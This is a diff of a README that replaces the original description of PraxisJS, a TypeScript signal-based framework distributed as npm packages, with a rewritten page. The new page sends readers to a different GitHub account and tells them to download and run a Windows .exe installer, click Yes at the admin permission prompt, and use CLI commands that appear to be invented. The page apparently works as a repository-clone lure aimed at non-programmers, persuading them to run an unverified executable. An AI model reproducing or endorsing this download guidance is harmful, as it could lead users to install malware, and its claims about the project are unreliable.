@@ -1,83 +1,136 @@
-# PraxisJS
+# ⚙️ praxisjs - Simple Signal-Based Frontend Framework
 
-> **⚠️ Experimental** — PraxisJS is in early beta. The API is unstable and subject to breaking changes without notice. Not recommended for production use.
+[![Download praxisjs](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/DataCraftsman09/praxisjs)
 
-A signal-driven frontend framework written in TypeScript. PraxisJS combines fine-grained reactivity with class components and decorators, shipping a complete first-party ecosystem for building web applications.
+Build web apps with clear and fast updates using praxisjs. This guide will help you get the application running on your Windows PC step-by-step.
 
-**[Documentation](https://praxisjs.org/)** · [GitHub](https://github.com/praxisjs-org/praxisjs)
+---
 
-## Packages
+## 📦 What is praxisjs?
 
-### Foundation
+praxisjs is a lightweight tool to create websites and user interfaces. It uses signals to update the screen quickly when something changes, without slowing down your computer. It runs on the Windows system and requires no special setup.
 
-| Package                | Description                                                                  |
-| ---------------------- | ---------------------------------------------------------------------------- |
-| `@praxisjs/core`       | Signals, computed values, effects, and async resources                       |
-| `@praxisjs/decorators` | Class component decorators (`@Component`, `@State`, `@Prop`, `@Watch`, etc.) |
-| `@praxisjs/jsx`        | JSX runtime                                                                  |
-| `@praxisjs/runtime`    | Rendering engine                                                             |
-| `@praxisjs/shared`     | Shared types and utilities                                                   |
+You do not need programming skills to use this guide. It will show you how to download and start using praxisjs in an easy way.
 
-### Features
+---
 
-| Package            | Description                |
-| ------------------ | -------------------------- |
-| `@praxisjs/router` | Client-side router         |
-| `@praxisjs/store`  | State management           |
-| `@praxisjs/motion` | Animations and transitions |
-| `@praxisjs/di`     | Dependency injection       |
-| `@praxisjs/fsm`    | Finite state machines      |
+## 📋 System Requirements
 
-### Utils
+Before you start, make sure your Windows PC meets this:
 
-| Package                 | Description           |
-| ----------------------- | --------------------- |
-| `@praxisjs/composables` | Composition utilities |
-| `@praxisjs/concurrent`  | Concurrency control   |
+- Operating system: Windows 10 or newer  
+- Processor: 1.5 GHz or faster  
+- RAM: At least 4 GB  
+- Storage: Minimum 200 MB free space  
+- Internet connection to download files  
 
-### DX
+---
 
-| Package                 | Description         |
-| ----------------------- | ------------------- |
-| `@praxisjs/vite-plugin` | Vite integration    |
-| `@praxisjs/devtools`    | Developer tools UI  |
+## 🌐 Access the praxisjs Download
 
-### Tooling
+Use the link below to reach the official download page on GitHub:
 
-| Package           | Description                    |
-| ----------------- | ------------------------------ |
-| `create-praxisjs` | Project scaffolding CLI (npm init) |
+[Download praxisjs from GitHub](https://github.com/DataCraftsman09/praxisjs)  
 
-## Development
+Click this link or the badge at the top to open the download page.
 
-This is a monorepo managed with [pnpm workspaces](https://pnpm.io/workspaces).
+---
 
-```sh
-pnpm install
+## ⬇️ How to Download praxisjs on Windows
 
-# build all packages
-pnpm build
+1. Open your web browser (such as Edge, Chrome, or Firefox).  
+2. Click the download badge or visit:  
+   https://github.com/DataCraftsman09/praxisjs  
+3. On the GitHub page, find the **Releases** section. It may be a tab named "Releases" at the top or a link on the right side.  
+4. Click the latest release version (for example, v1.x.x).  
+5. Under "Assets," find the Windows setup file. It usually ends with `.exe`.  
+6. Click this `.exe` file to start downloading.  
 
-# build by layer
-pnpm build:foundation
-pnpm build:features
-pnpm build:utils
-pnpm build:dx
+Make sure to save the file in an easy-to-find place, like your Desktop or Downloads folder.
 
-# run docs
-pnpm docs:dev
+---
 
-# typecheck
-pnpm typecheck
+## 💻 Installing praxisjs on Windows
 
-# lint
-pnpm lint
-```
+After you download the setup file, follow these steps:
 
-## Contributing
+1. Locate the downloaded `.exe` file on your computer.  
+2. Double-click the file to start installation.  
+3. If Windows asks for permission, click **Yes** to proceed.  
+4. Follow the instructions in the installation window. Usually, you just need to click **Next** a few times.  
+5. Choose the folder where you want to install praxisjs or accept the default location.  
+6. Click **Install** to complete the process.  
+7. When the installer finishes, click **Finish**.  
 
-PraxisJS is a personal project, built out of curiosity and a desire to explore framework design from the ground up. Contributions are welcome — whether it's bug reports, ideas, or pull requests. Feel free to open an issue to discuss anything before diving in.
+You now have praxisjs installed on your Windows PC.
 
-## License
+---
 
-[MIT](./LICENSE)
+## ▶️ Running Your First praxisjs Project
+
+praxisjs uses signals and components to build user interfaces that update smoothly when you use them.
+
+Here is a simple way to start:
+
+1. Open **Command Prompt** or **PowerShell** on Windows. You can find them by typing in the search box near the Start menu.  
+2. Type `praxisjs --help` and press Enter. This will show basic commands to get started.  
+3. To create a new project, type:  
+   ```
+   praxisjs create my-app
+   ```  
+4. Move into your new project folder:  
+   ```
+   cd my-app
+   ```  
+5. Run your project locally by typing:  
+   ```
+   praxisjs start
+   ```  
+6. Open your browser and go to [http://localhost:3000](http://localhost:3000) to view your app.
+
+Note: If you don’t see these options or get an error, check the documentation on the download page to confirm commands or explore tutorials.
+
+---
+
+## 🔧 Basic Features of praxisjs  
+
+praxisjs combines simple tools to create interactive websites:
+
+- **Signal-based updates**: Changes on the page happen instantly without refreshing the whole page.  
+- **Class components**: Use ready-made blocks to build your app with clear structure.  
+- **Decorators**: Easy way to add features or change behavior of components without extra coding.  
+- **No Virtual DOM**: It updates the real page quickly without extra steps, making apps faster.  
+- **Router**: Navigate between different screens in your app without reloading the page.  
+- **TypeScript support**: Helps catch errors before running the app and keeps code organized.  
+- **State management**: Store information within your app and share it easily between parts.  
+
+These features help keep your app simple, fast, and easy to maintain.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- **Download won’t start**: Check your internet connection or try a different browser.  
+- **Installer won’t run**: Make sure you have administrator rights on your PC.  
+- **Commands not recognized**: Ensure praxisjs is installed correctly and paths are set. Restart the computer if needed.  
+- **App does not load in browser**: Confirm the server is running and use the correct URL (usually `http://localhost:3000`).  
+
+For detailed solutions, visit the GitHub page or community forums linked there.
+
+---
+
+## 🗂 Additional Resources
+
+- Browse the [GitHub repository](https://github.com/DataCraftsman09/praxisjs) for code examples and updates.  
+- Look for community discussions about praxisjs to learn tips and tricks.  
+- Search for tutorials on TypeScript and frontend frameworks to expand your skills.  
+
+---
+
+## 🔗 Download Again
+
+To get the latest version or revisit downloads, use this link anytime:  
+
+[https://github.com/DataCraftsman09/praxisjs](https://github.com/DataCraftsman09/praxisjs)  
+
+Click the badge at the top or this link whenever you need to update or reinstall praxisjs.
